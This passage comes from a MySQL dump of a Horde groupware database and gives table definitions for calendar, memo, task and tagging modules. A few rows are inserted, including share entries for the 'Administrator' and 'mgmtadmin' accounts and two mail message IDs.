-- Table structure for table `kronolith_sharesng_users`
--

DROP TABLE IF EXISTS `kronolith_sharesng_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kronolith_sharesng_users` (
  `share_id` int(11) NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  `perm_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_1024` tinyint(1) NOT NULL DEFAULT '0',
  KEY `index_kronolith_sharesng_users_on_share_id` (`share_id`),
  KEY `index_kronolith_sharesng_users_on_user_uid` (`user_uid`),
  KEY `index_kronolith_sharesng_users_on_perm_2` (`perm_2`),
  KEY `index_kronolith_sharesng_users_on_perm_4` (`perm_4`),
  KEY `index_kronolith_sharesng_users_on_perm_8` (`perm_8`),
  KEY `index_kronolith_sharesng_users_on_perm_16` (`perm_16`),
  KEY `index_kronolith_sharesng_users_on_perm_1024` (`perm_1024`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kronolith_sharesng_users`
--

LOCK TABLES `kronolith_sharesng_users` WRITE;
/*!40000 ALTER TABLE `kronolith_sharesng_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `kronolith_sharesng_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kronolith_storage`
--

DROP TABLE IF EXISTS `kronolith_storage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kronolith_storage` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `vfb_owner` varchar(255) DEFAULT NULL,
  `vfb_email` varchar(255) NOT NULL,
  `vfb_serialized` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_kronolith_storage_on_vfb_owner` (`vfb_owner`),
  KEY `index_kronolith_storage_on_vfb_email` (`vfb_email`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kronolith_storage`
--

LOCK TABLES `kronolith_storage` WRITE;
/*!40000 ALTER TABLE `kronolith_storage` DISABLE KEYS */;
/*!40000 ALTER TABLE `kronolith_storage` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `mnemo_memos`
--

DROP TABLE IF EXISTS `mnemo_memos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `mnemo_memos` (
  `memo_owner` varchar(255) NOT NULL,
  `memo_id` varchar(32) NOT NULL,
  `memo_uid` varchar(255) NOT NULL,
  `memo_desc` varchar(255) NOT NULL,
  `memo_body` text,
  `memo_private` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`memo_owner`,`memo_id`),
  KEY `index_mnemo_memos_on_memo_owner` (`memo_owner`),
  KEY `index_mnemo_memos_on_memo_uid` (`memo_uid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `mnemo_memos`
--

LOCK TABLES `mnemo_memos` WRITE;
/*!40000 ALTER TABLE `mnemo_memos` DISABLE KEYS */;
/*!40000 ALTER TABLE `mnemo_memos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `mnemo_schema_info`
--

DROP TABLE IF EXISTS `mnemo_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `mnemo_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `mnemo_schema_info`
--

LOCK TABLES `mnemo_schema_info` WRITE;
/*!40000 ALTER TABLE `mnemo_schema_info` DISABLE KEYS */;
INSERT INTO `mnemo_schema_info` VALUES (8);
/*!40000 ALTER TABLE `mnemo_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `mnemo_shares`
--

DROP TABLE IF EXISTS `mnemo_shares`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `mnemo_shares` (
  `share_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_name` varchar(255) NOT NULL,
  `share_owner` varchar(255) NOT NULL,
  `share_flags` int(11) NOT NULL DEFAULT '0',
  `perm_creator` int(11) NOT NULL DEFAULT '0',
  `perm_default` int(11) NOT NULL DEFAULT '0',
  `perm_guest` int(11) NOT NULL DEFAULT '0',
  `attribute_name` varchar(255) NOT NULL,
  `attribute_desc` varchar(255) DEFAULT NULL,
  `share_parents` varchar(4000) DEFAULT NULL,
  PRIMARY KEY (`share_id`),
  KEY `index_mnemo_shares_on_share_name` (`share_name`),
  KEY `index_mnemo_shares_on_share_owner` (`share_owner`),
  KEY `index_mnemo_shares_on_perm_creator` (`perm_creator`),
  KEY `index_mnemo_shares_on_perm_default` (`perm_default`),
  KEY `index_mnemo_shares_on_perm_guest` (`perm_guest`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `mnemo_shares`
--

LOCK TABLES `mnemo_shares` WRITE;
/*!40000 ALTER TABLE `mnemo_shares` DISABLE KEYS */;
/*!40000 ALTER TABLE `mnemo_shares` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `mnemo_shares_groups`
--

DROP TABLE IF EXISTS `mnemo_shares_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `mnemo_shares_groups` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_id` int(11) NOT NULL,
  `group_uid` varchar(255) NOT NULL,
  `perm` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_mnemo_shares_groups_on_share_id` (`share_id`),
  KEY `index_mnemo_shares_groups_on_group_uid` (`group_uid`),
  KEY `index_mnemo_shares_groups_on_perm` (`perm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `mnemo_shares_groups`
--

LOCK TABLES `mnemo_shares_groups` WRITE;
/*!40000 ALTER TABLE `mnemo_shares_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `mnemo_shares_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `mnemo_shares_users`
--

DROP TABLE IF EXISTS `mnemo_shares_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `mnemo_shares_users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_id` int(11) NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  `perm` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_mnemo_shares_users_on_share_id` (`share_id`),
  KEY `index_mnemo_shares_users_on_user_uid` (`user_uid`),
  KEY `index_mnemo_shares_users_on_perm` (`perm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `mnemo_shares_users`
--

LOCK TABLES `mnemo_shares_users` WRITE;
/*!40000 ALTER TABLE `mnemo_shares_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `mnemo_shares_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `mnemo_sharesng`
--

DROP TABLE IF EXISTS `mnemo_sharesng`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `mnemo_sharesng` (
  `share_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_name` varchar(255) NOT NULL,
  `share_owner` varchar(255) DEFAULT NULL,
  `share_flags` int(11) NOT NULL DEFAULT '0',
  `perm_creator_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_16` tinyint(1) NOT NULL DEFAULT '0',
  `attribute_name` varchar(255) NOT NULL,
  `attribute_desc` varchar(255) DEFAULT NULL,
  `share_parents` varchar(4000) DEFAULT NULL,
  PRIMARY KEY (`share_id`),
  KEY `index_mnemo_sharesng_on_share_name` (`share_name`),
  KEY `index_mnemo_sharesng_on_share_owner` (`share_owner`),
  KEY `index_mnemo_sharesng_on_perm_creator_2` (`perm_creator_2`),
  KEY `index_mnemo_sharesng_on_perm_creator_4` (`perm_creator_4`),
  KEY `index_mnemo_sharesng_on_perm_creator_8` (`perm_creator_8`),
  KEY `index_mnemo_sharesng_on_perm_creator_16` (`perm_creator_16`),
  KEY `index_mnemo_sharesng_on_perm_default_2` (`perm_default_2`),
  KEY `index_mnemo_sharesng_on_perm_default_4` (`perm_default_4`),
  KEY `index_mnemo_sharesng_on_perm_default_8` (`perm_default_8`),
  KEY `index_mnemo_sharesng_on_perm_default_16` (`perm_default_16`),
  KEY `index_mnemo_sharesng_on_perm_guest_2` (`perm_guest_2`),
  KEY `index_mnemo_sharesng_on_perm_guest_4` (`perm_guest_4`),
  KEY `index_mnemo_sharesng_on_perm_guest_8` (`perm_guest_8`),
  KEY `index_mnemo_sharesng_on_perm_guest_16` (`perm_guest_16`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `mnemo_sharesng`
--

LOCK TABLES `mnemo_sharesng` WRITE;
/*!40000 ALTER TABLE `mnemo_sharesng` DISABLE KEYS */;
INSERT INTO `mnemo_sharesng` VALUES (1,'zvbysqO5iuxsEYK9EH0MUQG','Administrator',0,0,0,0,0,0,0,0,0,0,0,0,0,'Notepad of Administrator',NULL,NULL),(2,'PfoFOKBLzXazxG3d6ljW_ZU','mgmtadmin',0,0,0,0,0,0,0,0,0,0,0,0,0,'Notepad of mgmtadmin',NULL,NULL);
/*!40000 ALTER TABLE `mnemo_sharesng` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `mnemo_sharesng_groups`
--

DROP TABLE IF EXISTS `mnemo_sharesng_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `mnemo_sharesng_groups` (
  `share_id` int(11) NOT NULL,
  `group_uid` varchar(255) NOT NULL,
  `perm_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_16` tinyint(1) NOT NULL DEFAULT '0',
  KEY `index_mnemo_sharesng_groups_on_share_id` (`share_id`),
  KEY `index_mnemo_sharesng_groups_on_group_uid` (`group_uid`),
  KEY `index_mnemo_sharesng_groups_on_perm_2` (`perm_2`),
  KEY `index_mnemo_sharesng_groups_on_perm_4` (`perm_4`),
  KEY `index_mnemo_sharesng_groups_on_perm_8` (`perm_8`),
  KEY `index_mnemo_sharesng_groups_on_perm_16` (`perm_16`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `mnemo_sharesng_groups`
--

LOCK TABLES `mnemo_sharesng_groups` WRITE;
/*!40000 ALTER TABLE `mnemo_sharesng_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `mnemo_sharesng_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `mnemo_sharesng_users`
--

DROP TABLE IF EXISTS `mnemo_sharesng_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `mnemo_sharesng_users` (
  `share_id` int(11) NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  `perm_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_16` tinyint(1) NOT NULL DEFAULT '0',
  KEY `index_mnemo_sharesng_users_on_share_id` (`share_id`),
  KEY `index_mnemo_sharesng_users_on_user_uid` (`user_uid`),
  KEY `index_mnemo_sharesng_users_on_perm_2` (`perm_2`),
  KEY `index_mnemo_sharesng_users_on_perm_4` (`perm_4`),
  KEY `index_mnemo_sharesng_users_on_perm_8` (`perm_8`),
  KEY `index_mnemo_sharesng_users_on_perm_16` (`perm_16`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `mnemo_sharesng_users`
--

LOCK TABLES `mnemo_sharesng_users` WRITE;
/*!40000 ALTER TABLE `mnemo_sharesng_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `mnemo_sharesng_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `nag_schema_info`
--

DROP TABLE IF EXISTS `nag_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `nag_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `nag_schema_info`
--

LOCK TABLES `nag_schema_info` WRITE;
/*!40000 ALTER TABLE `nag_schema_info` DISABLE KEYS */;
INSERT INTO `nag_schema_info` VALUES (14);
/*!40000 ALTER TABLE `nag_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `nag_shares`
--

DROP TABLE IF EXISTS `nag_shares`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `nag_shares` (
  `share_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_name` varchar(255) NOT NULL,
  `share_owner` varchar(255) DEFAULT NULL,
  `share_flags` int(2) NOT NULL DEFAULT '0',
  `perm_creator` int(2) NOT NULL DEFAULT '0',
  `perm_default` int(2) NOT NULL DEFAULT '0',
  `perm_guest` int(2) NOT NULL DEFAULT '0',
  `attribute_name` varchar(255) NOT NULL,
  `attribute_desc` varchar(255) DEFAULT NULL,
  `attribute_color` varchar(7) DEFAULT NULL,
  `share_parents` varchar(4000) DEFAULT NULL,
  `attribute_issmart` int(11) DEFAULT '0',
  `attribute_search` varchar(4000) DEFAULT NULL,
  PRIMARY KEY (`share_id`),
  KEY `index_nag_shares_on_share_name` (`share_name`),
  KEY `index_nag_shares_on_share_owner` (`share_owner`),
  KEY `index_nag_shares_on_perm_creator` (`perm_creator`),
  KEY `index_nag_shares_on_perm_default` (`perm_default`),
  KEY `index_nag_shares_on_perm_guest` (`perm_guest`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `nag_shares`
--

LOCK TABLES `nag_shares` WRITE;
/*!40000 ALTER TABLE `nag_shares` DISABLE KEYS */;
/*!40000 ALTER TABLE `nag_shares` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `nag_shares_groups`
--

DROP TABLE IF EXISTS `nag_shares_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `nag_shares_groups` (
  `share_id` int(11) NOT NULL,
  `group_uid` varchar(255) NOT NULL,
  `perm` int(2) NOT NULL,
  KEY `index_nag_shares_groups_on_share_id` (`share_id`),
  KEY `index_nag_shares_groups_on_group_uid` (`group_uid`),
  KEY `index_nag_shares_groups_on_perm` (`perm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `nag_shares_groups`
--

LOCK TABLES `nag_shares_groups` WRITE;
/*!40000 ALTER TABLE `nag_shares_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `nag_shares_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `nag_shares_users`
--

DROP TABLE IF EXISTS `nag_shares_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `nag_shares_users` (
  `share_id` int(11) NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  `perm` int(2) NOT NULL,
  KEY `index_nag_shares_users_on_share_id` (`share_id`),
  KEY `index_nag_shares_users_on_user_uid` (`user_uid`),
  KEY `index_nag_shares_users_on_perm` (`perm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `nag_shares_users`
--

LOCK TABLES `nag_shares_users` WRITE;
/*!40000 ALTER TABLE `nag_shares_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `nag_shares_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `nag_sharesng`
--

DROP TABLE IF EXISTS `nag_sharesng`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `nag_sharesng` (
  `share_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_name` varchar(255) NOT NULL,
  `share_owner` varchar(255) DEFAULT NULL,
  `share_flags` int(11) NOT NULL DEFAULT '0',
  `perm_creator_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_16` tinyint(1) NOT NULL DEFAULT '0',
  `attribute_name` varchar(255) NOT NULL,
  `attribute_desc` varchar(255) DEFAULT NULL,
  `attribute_color` varchar(7) DEFAULT NULL,
  `share_parents` varchar(4000) DEFAULT NULL,
  `attribute_issmart` int(11) DEFAULT '0',
  `attribute_search` text,
  PRIMARY KEY (`share_id`),
  KEY `index_nag_sharesng_on_share_name` (`share_name`),
  KEY `index_nag_sharesng_on_share_owner` (`share_owner`),
  KEY `index_nag_sharesng_on_perm_creator_2` (`perm_creator_2`),
  KEY `index_nag_sharesng_on_perm_creator_4` (`perm_creator_4`),
  KEY `index_nag_sharesng_on_perm_creator_8` (`perm_creator_8`),
  KEY `index_nag_sharesng_on_perm_creator_16` (`perm_creator_16`),
  KEY `index_nag_sharesng_on_perm_default_2` (`perm_default_2`),
  KEY `index_nag_sharesng_on_perm_default_4` (`perm_default_4`),
  KEY `index_nag_sharesng_on_perm_default_8` (`perm_default_8`),
  KEY `index_nag_sharesng_on_perm_default_16` (`perm_default_16`),
  KEY `index_nag_sharesng_on_perm_guest_2` (`perm_guest_2`),
  KEY `index_nag_sharesng_on_perm_guest_4` (`perm_guest_4`),
  KEY `index_nag_sharesng_on_perm_guest_8` (`perm_guest_8`),
  KEY `index_nag_sharesng_on_perm_guest_16` (`perm_guest_16`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `nag_sharesng`
--

LOCK TABLES `nag_sharesng` WRITE;
/*!40000 ALTER TABLE `nag_sharesng` DISABLE KEYS */;
INSERT INTO `nag_sharesng` VALUES (1,'1huILBj16xbH5EwqlOwaxgO','Administrator',0,0,0,0,0,0,0,0,0,0,0,0,0,'Task list of Administrator',NULL,'#56297e',NULL,0,NULL),(2,'CSnKjFW2sfRDp13sNfC7ri9','mgmtadmin',0,0,0,0,0,0,0,0,0,0,0,0,0,'Task list of mgmtadmin',NULL,'#b3469c',NULL,0,NULL);
/*!40000 ALTER TABLE `nag_sharesng` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `nag_sharesng_groups`
--

DROP TABLE IF EXISTS `nag_sharesng_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `nag_sharesng_groups` (
  `share_id` int(11) NOT NULL,
  `group_uid` varchar(255) NOT NULL,
  `perm_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_16` tinyint(1) NOT NULL DEFAULT '0',
  KEY `index_nag_sharesng_groups_on_share_id` (`share_id`),
  KEY `index_nag_sharesng_groups_on_group_uid` (`group_uid`),
  KEY `index_nag_sharesng_groups_on_perm_2` (`perm_2`),
  KEY `index_nag_sharesng_groups_on_perm_4` (`perm_4`),
  KEY `index_nag_sharesng_groups_on_perm_8` (`perm_8`),
  KEY `index_nag_sharesng_groups_on_perm_16` (`perm_16`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `nag_sharesng_groups`
--

LOCK TABLES `nag_sharesng_groups` WRITE;
/*!40000 ALTER TABLE `nag_sharesng_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `nag_sharesng_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `nag_sharesng_users`
--

DROP TABLE IF EXISTS `nag_sharesng_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `nag_sharesng_users` (
  `share_id` int(11) NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  `perm_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_16` tinyint(1) NOT NULL DEFAULT '0',
  KEY `index_nag_sharesng_users_on_share_id` (`share_id`),
  KEY `index_nag_sharesng_users_on_user_uid` (`user_uid`),
  KEY `index_nag_sharesng_users_on_perm_2` (`perm_2`),
  KEY `index_nag_sharesng_users_on_perm_4` (`perm_4`),
  KEY `index_nag_sharesng_users_on_perm_8` (`perm_8`),
  KEY `index_nag_sharesng_users_on_perm_16` (`perm_16`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `nag_sharesng_users`
--

LOCK TABLES `nag_sharesng_users` WRITE;
/*!40000 ALTER TABLE `nag_sharesng_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `nag_sharesng_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `nag_tasks`
--

DROP TABLE IF EXISTS `nag_tasks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `nag_tasks` (
  `task_id` varchar(32) NOT NULL,
  `task_owner` varchar(255) NOT NULL,
  `task_creator` varchar(255) NOT NULL,
  `task_parent` varchar(255) DEFAULT NULL,
  `task_assignee` varchar(255) DEFAULT NULL,
  `task_name` varchar(255) NOT NULL,
  `task_uid` varchar(255) NOT NULL,
  `task_desc` text,
  `task_start` int(11) DEFAULT NULL,
  `task_due` int(11) DEFAULT NULL,
  `task_priority` int(11) NOT NULL DEFAULT '0',
  `task_estimate` float DEFAULT NULL,
  `task_completed` int(1) NOT NULL DEFAULT '0',
  `task_completed_date` int(11) DEFAULT NULL,
  `task_alarm` int(11) NOT NULL DEFAULT '0',
  `task_alarm_methods` text,
  `task_private` int(1) NOT NULL DEFAULT '0',
  `task_recurtype` int(11) DEFAULT '0',
  `task_recurinterval` int(11) DEFAULT NULL,
  `task_recurdays` int(11) DEFAULT NULL,
  `task_recurenddate` datetime DEFAULT NULL,
  `task_recurcount` int(11) DEFAULT NULL,
  `task_exceptions` text,
  `task_completions` text,
  PRIMARY KEY (`task_id`),
  KEY `index_nag_tasks_on_task_owner` (`task_owner`),
  KEY `index_nag_tasks_on_task_uid` (`task_uid`),
  KEY `index_nag_tasks_on_task_start` (`task_start`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `nag_tasks`
--

LOCK TABLES `nag_tasks` WRITE;
/*!40000 ALTER TABLE `nag_tasks` DISABLE KEYS */;
/*!40000 ALTER TABLE `nag_tasks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `rampage_objects`
--

DROP TABLE IF EXISTS `rampage_objects`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `rampage_objects` (
  `object_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `object_name` varchar(255) NOT NULL,
  `type_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`object_id`),
  UNIQUE KEY `rampage_objects_type_object_name` (`type_id`,`object_name`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `rampage_objects`
--

LOCK TABLES `rampage_objects` WRITE;
/*!40000 ALTER TABLE `rampage_objects` DISABLE KEYS */;
INSERT INTO `rampage_objects` VALUES (1,'20170605230311.iuxg_zuuiXpAJNn59LzI28t@mail.metropolis-general.com',3),(2,'20170605230836.2za6kjJSWovaOLUwbNSxBy0@mail.metropolis-general.com',3);
/*!40000 ALTER TABLE `rampage_objects` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `rampage_tag_stats`
--

DROP TABLE IF EXISTS `rampage_tag_stats`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `rampage_tag_stats` (
  `tag_id` int(10) unsigned NOT NULL,
  `count` int(10) unsigned DEFAULT NULL,
  PRIMARY KEY (`tag_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `rampage_tag_stats`
--

LOCK TABLES `rampage_tag_stats` WRITE;
/*!40000 ALTER TABLE `rampage_tag_stats` DISABLE KEYS */;
/*!40000 ALTER TABLE `rampage_tag_stats` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `rampage_tagged`
--

DROP TABLE IF EXISTS `rampage_tagged`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `rampage_tagged` (
  `user_id` int(10) unsigned NOT NULL,
  `object_id` int(10) unsigned NOT NULL,
  `tag_id` int(10) unsigned NOT NULL,
  `created` datetime DEFAULT NULL,
  PRIMARY KEY (`user_id`,`object_id`,`tag_id`),
  KEY `rampage_tagged_object_id` (`object_id`),
  KEY `rampage_tagged_tag_id` (`tag_id`),
  KEY `rampage_tagged_created` (`created`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `rampage_tagged`
--

LOCK TABLES `rampage_tagged` WRITE;
/*!40000 ALTER TABLE `rampage_tagged` DISABLE KEYS */;
/*!40000 ALTER TABLE `rampage_tagged` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `rampage_tags`
--

DROP TABLE IF EXISTS `rampage_tags`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `rampage_tags` (
  `tag_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `tag_name` varchar(255) NOT NULL,
  PRIMARY KEY (`tag_id`),
  UNIQUE KEY `rampage_tags_tag_name` (`tag_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `rampage_tags`
--

LOCK TABLES `rampage_tags` WRITE;
/*!40000 ALTER TABLE `rampage_tags` DISABLE KEYS */;
/*!40000 ALTER TABLE `rampage_tags` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `rampage_types`
--

DROP TABLE IF EXISTS `rampage_types`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `rampage_types` (
  `type_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `type_name` varchar(255) NOT NULL,
  PRIMARY KEY (`type_id`),
  UNIQUE KEY `rampage_objects_type_name` (`type_name`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `rampage_types`
--

LOCK TABLES `rampage_types` WRITE;
/*!40000 ALTER TABLE `rampage_types` DISABLE KEYS */;
